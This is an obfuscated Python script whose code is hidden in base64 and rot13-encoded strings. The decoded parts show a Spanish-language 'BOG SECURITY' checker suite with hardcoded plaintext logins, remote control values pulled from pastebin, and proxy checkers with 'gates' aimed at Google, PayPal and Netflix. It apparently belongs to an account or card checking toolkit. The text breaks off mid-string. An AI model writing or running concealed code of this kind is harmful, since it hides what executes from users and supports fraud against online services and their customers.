import base64, codecs
magic = 'I0NIRUNLRVIgVUkKaW1wb3J0IG9zLCBzeXMsIHRpbWUKdHJ5OgogaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKICBwcmludCgiIEluc3RhbGxpbmcgcmVxdWVzdHMgTW9kdWxlIikKICBpZiBvcy5uYW1lPT0nbnQnOgogICAgdHJ5OgogICAgICBvcy5zeXN0ZW0oJ3BpcDMgaW5zdGFsbCByZXF1ZXN0cycpCiAgICBleGNlcHQ6CiAgICAgIHByaW50ICgiSW5zdGFsbCBQeXRob24tUGlwIFNpciIpCiAgICAgIHJhd19pbnB1dCgnJykKICBlbHNlOgogICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgcmVxdWVzdHMnKQoKdHJ5OgogZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZQpleGNlcHQ6CiAgcHJpbnQoIiBJbnN0YWxsaW5nIGNvbG9yYW1hIE1vZHVsZSIpCiAgaWYgb3MubmFtZT09J250JzoKICAgIHRyeToKICAgICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgY29sb3JhbWEnKQogICAgZXhjZXB0OgogICAgICBwcmludCAoIkluc3RhbGwgUHl0aG9uLVBpcCBTaXIiKQogICAgICByYXdfaW5wdXQoJycpCiAgZWxzZToKICAgIG9zLnN5c3RlbSgncGlwMyBpbnN0YWxsIGNvbG9yYW1hJykKCnZpdmVzbj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9wV3Z6NmtrcycpLnRleHQKdmVycz1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy82dXRMTEs2aCcpLnRleHQKZ3JhdGlzPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L01GbnhSOWRtIikudGV4dApnYXRlMT1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9LTEN2SktkTiIpLnRleHQKZ2F0ZTI9cmVxdWVzdHMuZ2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvRzRrVDR3dXgiKS50ZXh0Cm1lbnNhamUgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9IbWpRaGZqeSIpLnRleHQKaWYgc3lzLnZlcnNpb25faW5mb1swXSA8IDM6CiAgaW5wdXQgPSByYXdfaW5wdXQKZWxzZToKICByYXdfaW5wdXQgPSBpbnB1dAoKY3JlZGl0b3M9MTAwCndoaWxlIFRydWU6CgogICAgCiAgICBuYW1lID0gcmF3X2lucHV0KCdJbmdyZXNlIHN1IG5vbWJyZSBkZSB1c3VhcmlvOiAnKQogICAgaWYgbmFtZSAhPSAnRW1pbGlvJyBhbmQgbmFtZSAhPSAnRW1tYW51ZWwnIGFuZCBuYW1lICE9ICd1c3I1MjQnIGFuZCBuYW1lICE9ICd1c3IxNjInIGFuZCBuYW1lICE9ICdib2d0ZXN0ZXInIGFuZCBuYW1lICE9ICdzYW0nIGFuZCBuYW1lICE9ICdjaGtncmF0aXMnOgogICAgICAgIHByaW50ICgndXN1YXJpbyBpbmNvcnJlY3RvJykKICAgIGVsc2U6CiAgICAgICAgaWYgbmFtZSA9PSAnRW1pbGlvJzoKICAgICAgICAgICAgICAgIHBhc3dfRW1pbGlvID0gcmF3X2lucHV0KCdJbmdyZXNlIHN1IHBhc3N3b3JkOiAnKQogICAgICAgICAgICAgICAgaWYgcGFzd19FbWlsaW8gIT0gJ0FlMTJ2Y2hsJzoKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1Bhc3N3b3JkIGluY29ycmVjdGEnKQogICAgICAgICAgICAgICAgICAgIGNyZWRpdG9zLT0xCiAgICAgICAgICAgICAgICAgICAgaWYgY3JlZGl0b3M9PTA6CiAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ0JpZW52ZW5pZG8gTElERVIhICcpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ0VtbWFudWVsJzoKICAgICAgICAgICAgICAgIHBhc3dfRW1tYW51ZWwgPSByYXdfaW5wdXQoJ0luZ3Jlc2Ugc3UgcGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0VtbWFudWVsICE9ICdyb25hbGRpdG8xJzoKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1Bhc3N3b3JkIGluY29ycmVjdGEnKQogICAgICAgICAgICAgICAgICAgIGNyZWRpdG9zLT0xCiAgICAgICAgICAgICAgICAgICAgaWYgY3JlZGl0b3M9PTA6CiAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAoJ0JpZW52ZW5pZG8gYSBMSURFUicpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbGlmIG5hbWUgPT0gJ2JvZ3Rlc3Rlcic6CiAgICAgICAgICAgICAgICBwYXN3X0NhY2EgPSByYXdfaW5wdXQoJ0luZ3Jlc2EgbGEgUGFzc3dvcmQ6ICcpCiAgICAgICAgICAgICAgICBpZiBwYXN3X0NhY2EgIT0gJ3RlYW1ib2cnOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgaW5jb3JyZWN0YScpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8gQURNSU4nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAnc2FtJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAncml1ayc6CiAgICAgICAgICAgICAgICAgIHByaW50KCdQYXNzd29yZCBJTkNPUlJFQ1RBICcpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8gQURNSU4nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAndXNyMTYyJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnaGF2b2syNTYnOgogICAgICAgICAgICAgICAgICBwcmludCgnUGFzc3dvcmQgSU5DT1JSRUNUQSAnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIHByaW50KCdCaWVudmVuaWRvIFNpcicpIAogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAndXNyNTI0JzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnZG9vbTI1Mic6CiAgICAgICAgICAgICAgICAgIHByaW50KCdQYXNzd29yZCBJTkNPUlJFQ1RBICcpCiAgICAgICAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgcHJpbnQoJ0JpZW52ZW5pZG8nKQogICAgICAgICAgICAgICAgICBicmVhawogICAgICAgIGVsaWYgbmFtZSA9PSAnY2hrZ3JhdGlzJzoKICAgICAgICAgICAgICAgIHBhc3dfQ2FjYSA9IHJhd19pbnB1dCgnSW5ncmVzYSBsYSBQYXNzd29yZDogJykKICAgICAgICAgICAgICAgIGlmIHBhc3dfQ2FjYSAhPSAnZ3JhdGlzJzoKICAgICAgICAgICAgICAgICAgcHJpbnQoJ1Bhc3N3b3JkIElOQ09SUkVDVEEnKQogICAgICAgICAgICAgICAgICBleGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgIGlmIGdyYXRpcz09JzI0NjA2JzoKICAgICAgICAgICAgICAgICAgICBwcmludCgiQmllbnZlbmlkbyIpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCgiTGEgQ3VlbnRhIGFoIGV4cGlyYWRvIikKICAgICAgICAgICAgICAgICAgICBleGl0KCkKZGVmIGNscygpOgoJbGludXggPSAnY2xlYXInCgl3aW5kb3dzID0gJ2NscycKCW9zLnN5c3RlbShbbGludXgsIHdpbmRvd3NdW29zLm5hbWUgPT0gJ250J10pCmlmIHZpdmVzbj09IjEiOgogIGxpdmVzY2hrPSLinJMiCmVsaWYgdml2ZXNuPT0iMCI6CiAgbGl2ZXNjaGs9IuKcmCIKZWxzZToKICBsaXZlc2Noaz0iSU5URVJOQUwgRVJST1IiCiM9PT09PT09PQppZiB2ZXJzPT0iMiI6CiAgcGFzcwplbGlmIHZlcnMgIT0gIjIiOgogIHByaW50KCJIYXkgVW5hIG51ZXZhIHZlcnNpw7NuIikKICBpbnB1dCgiUFJFU0lPTkEgRU5URVIgUEFSQSBDT05USU5VQVIiKQplbHNlOgogIHByaW50KCJFUlJPUiIpCiM9PT09PT09PQp0aW1lLnNsZWVwKDIpCmNscygpCmJhbm5lciA9ICIiIgpAQEBAQEBAICAgQEBAQEBAICAgQEBAQEBAQCAgCkBAISA'
love = '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'
god = 'AgICAgICAgICAgcHJveHkgPSB7Imh0dHAiOiAic29ja3M0Oi8vIiArIHByb3h5aXAsICJodHRwcyI6ICJzb2NrczQ6Ly8iICsgcHJveHlpcH0KCiAgICAgICAgICBTZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgICByZXNwb25zZSA9IFNlc3Npb24uZ2V0KGdhdG9zLCBwcm94aWVzPXByb3h5LCB0aW1lb3V0PTUpCiAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgcmV0dXJuIHB0eXBlCiAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgIHJldHVybiAiIgoKICAgICMgVmFsaWRhdGUgcHJveHkgdHlwZQogICAgICBkZWYgdmVyaWZ5UHJveHkoc2VsZiwgcHJveHkpOgogICAgICAgICAgcHJveHlfdHlwZSA9ICJJbnZhbGlkIgogICAgICAgICAgcHJveHkgPSBwcm94eS5yZXBsYWNlKCIgIiwgIiIpCiAgICAgICAgICBwcm94eSA9IHByb3h5LnJlcGxhY2UoIlxuIiwgIiIpCiAgICAgICAgICBwcmludChGb3JlLkNZQU4rIkNIRUNLSU5HOiB7fSIuZm9ybWF0KHByb3h5KSkKCiAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgcHJveHlfdHlwZSA9IHNlbGYuY2hlY2tQcm94eSgic29ja3M1IiwgcHJveHkpCiAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICBwcm94eV90eXBlID0gc2VsZi5jaGVja1Byb3h5KCJzb2NrczQiLCBwcm94eSkKICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgIHByb3h5X3R5cGUgPSBzZWxmLmNoZWNrUHJveHkoImh0dHBzIiwgcHJveHkpCiAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICBwcm94eV90eXBlID0gc2VsZi5jaGVja1Byb3h5KCJodHRwIiwgcHJveHkpCiAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgaWYgcHJveHlfdHlwZSAhPSAiSW52YWxpZCI6CiAgICAgICAgICAgICAgcHJpbnQoRm9yZS5HUkVFTisiTGl2ZSEge30gR2F0ZSA9PiB7fSA9PiAjQm9HX0NIS1xuIi5mb3JtYXQocHJveHksIGJvbml0bykpCiAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEKyJEZWFkIHt9IEdhdGUgPT4ge30gPT4gI0JvR19DSEtcbiIuZm9ybWF0KHByb3h5LCBib25pdG8pKQoKICAgICAgZGVmIGNoZWNrTGlzdChzZWxmKToKICAgICAgICAgIHdpdGggb3BlbignLi9wcm94aWVzLnR4dCcsICdyJykgICBhcyBmOgogICAgICAgICAgICAgIGZvciBsaW5lIGluIGY6CiAgICAgICAgICAgICAgICAgIHNlbGYudmVyaWZ5UHJveHkobGluZSkKCgogIGNoZWNrZXIgPSBQcm94eUNoZWNrZXIoKQogIGNoZWNrZXIuY2hlY2tMaXN0KCkKZWxpZiBudW1jaGs9PSIzIjoKICBpbXBvcnQgcmVxdWVzdHMKICBpbXBvcnQgZGF0ZXRpbWUKICBmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlCiAgaW1wb3J0IHRocmVhZGluZwogIGltcG9ydCBzeXMKICBpbXBvcnQgdGltZQoKICBkZWYgZXNjcnAocyk6CiAgICAgICAgICBmb3IgYyBpbiBzICsgJ1xuJzoKICAgICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjKQogICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxMC4gLyAxMDApCgoKICBnbG9iYWwgY291bnQKICBjb3VudCA9IDAKICBjbHMoKQogIHByaW50KCcnJwoKICAgICkgICAgICAgICAoICAgICAgICAgICAoICAgICAKICggLyggICAoICAgICApXCApICAgICAgICApXCApICAKIClcKCkpICApXCAgICgoKS8oICAgKCAgICgoKS8oICAKKChfKVwoKCgoXykoICAvKF8pKSAgKVwgICAvKF8pKSAKIF8oKF8pKVwgXyApXChfKSlfICAoKF8pIChfKSkgICAKfCB8fCB8KF8pX1woXyl8ICAgXCB8IF9ffC8gX198ICAKfCBfXyB8IC8gXyBcICB8IHwpIHx8IF98IFxfXyBcICAKfF98fF98L18vIFxfXCB8X19fLyB8X19ffHxfX18vICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgSFRUUCBQcm94eSBDaGVja2VyIAogICAgICAgIAoxLUdvb2dsZQoyLVBheXBhbFtCRVNUXQozLU5ldGZsaXgKNC1DdXN0b20gCicnJykKCiAgZmlsZSA9IGlucHV0KCdFbnRlciBuYW1lIG9mIGZpbGUgd2l0aCBwcm94aWVzOiAnKQogIGdhdGVzPSBpbnB1dCgiR2F0ZTogIikKICBpZiBnYXRlcz09IjEiOgogICAgZ2F0b3M9Imh0dHBzOi8vZ29vZ2xlLmNvbS8iCiAgZWxpZiBnYXRlcz09IjIiOgogICAgZ2F0b3M9Imh0dHBzOi8vcGF5cGFsLmNvbS8iCgogIGVsaWYgZ2F0ZXM9PSIzIjoKICAgIGdhdG9zPSJodHRwczovL25ldGZsaXguY29tLyIKCiAgZWxpZiBnYXRlcz09IjQiOgogICAgcHJpbnQoIkN1c3RvbSBHYXRlXG4iKQogICAgcHJpbnQoIkV4OiBbaHR0cHM6Ly9leGFtcGxlLmNvbS9dIikKICAgIGdhdG9zID0gaW5wdXQoIkxpbms6ICIpCiAgZWxzZToKICAgIGdhdG9zPSJodHRwczovL2N5YmVyc3NoLmNvbS8iCiAgICBwcmludCgiaW52YWxpZCBbVVNJTkcgQVVYSUxJQVJZIEdBVEVdIikKCiAgaWYgJy50eHQnIGluIGZpbGU6CiAgICAgIG9maWxlID0gZmlsZQogIGVsc2U6CiAgICAgIG9maWxlID0gZmlsZSArICcudHh0JwoKICB3aXRoIG9wZW4ob2ZpbGUsJ3InKSBhcyBwcm94eWZpbGU6CiAgICAgIHByb3hpZXMgPSBwcm94eWZpbGUucmVhZGxpbmVzKCkKICAgICAgYW1vdW50ID0gbGVuKHByb3hpZXMpCgogIGVzY3JwKEZvcmUuQ1lBTiArICdCT0cgU0VDVVJJVFkgLSBIVFRQL1MgUFJPWFkgQ0hFQ0tFUicpCgogIGRlZiBjaGVja19wcm94aWVzKHByb3h5LGFtb3VudCk6CiAgICAgIGdsb2JhbCBjb3VudAogICAgICBwcm94eSA9IHByb3h5LnN0cmlwKCkKICAgICAgcHJveHlEaWN0ID0geyAKICAgICAgICAiaHR0cHMiIDogcHJveHkKICAgIH0KICAgICAgc3RhcnQgPSBkYXRldGltZS5kYXRldGltZS5ub3coKQogICAgICB0cnk6CgoKICAgICAgICAgIHJlcyA9IHJlcXVlc3RzLmdldCh1cmw9Z2F0b3MscHJveGllcz1wcm94eURpY3QsdGltZW91dD01KQogICAgICAgICAgaWYgcmVzLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICBlbmQgPSBkYXRldGltZS5kYXRldGltZS5ub3coKQogICAgICAgICAgICAgIHJhd19zcGVlZCA9IHN0cihlbmQtc3RhcnQpLnNwbGl0KCcuJylbMV0KICAgICAgICAgICAgICBzcGVlZF9pbnQgPSByb3VuZChpbnQocmF3X3NwZWVkKSwyKQogICAgICAgICAgICAgIHNwZWVkID0gcm91bmQoc3BlZWRfaW50LzEwMDApCgogICAgICAgICAgICAjcHJpbnQgd29ya2luZyBwcm94aWVzIGFuZCB0aGVpciBzcGVlZAoKICAgICAgICAgICAgICBwcm94eV9pbmZvID0gZid7cHJveHl9IC0ge3NwZWVkfW1zID0+IEJvR19DSEsnCiAgICAgICAgICAgICAgcHJpbnQoRm9yZS5HUkVFTiArIHByb3h5X2luZm8pCiAgICAgICAgICAgIAogICAgICAgICAgICAgIGNvdW50ICs9IDEKICAgICAgICAgICAgCiAgICAgICAgICAgICAgCgogICAgICAgICAgICAKCiAgICAgIGV4Y2VwdDoKICAgICAgICAgIGNvdW50ICs9IDEKICAgICAgICAKICAgICAgICAgIHBhc3MKCgogIGZvciBwcm94eSBpbiBwcm94aWVzOgogICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1jaGVja19wcm94aWVzKHByb3h5LGFtb3VudCkpLnN0YXJ0KCkKZWxpZiBudW1jaGs9PSI0IjoKICBpbXBvcnQgb3MKICBpbXBvcnQgc210cGxpYgoKICBkZWYgaW5pemlhbGUoKToKICAgIGNscygpCiAgICBwcmludCgiIiIKICAgICAgICAgICgKICAgICAgIF9fLi4pX18KICAgICAuJyAgICAgICBgJy4KICAgICggLSAtICAgICAgIC